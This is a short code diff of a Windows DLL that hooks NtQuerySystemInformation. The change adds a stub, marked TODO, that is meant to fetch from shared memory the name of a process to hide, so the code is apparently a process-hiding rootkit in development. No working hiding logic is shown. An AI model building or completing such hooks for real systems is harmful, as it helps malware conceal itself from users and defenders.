@@ -6,7 +6,7 @@
 
 PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
 PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;
-
+char* process;
 
 NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -59,6 +59,10 @@ bool set_nt_hook()
 	return true; 
 }
 
+void get_process_name() {
+	// TODO: Access Shared Memory (File Mapping) and Retrieve name of process to hide
+}
+
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 {
 	switch(fdwReason)
@@ -67,6 +71,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 		if (!set_nt_hook()) {
 			return FALSE;
 		}
+		get_process_name();
 		break;
 	}
 
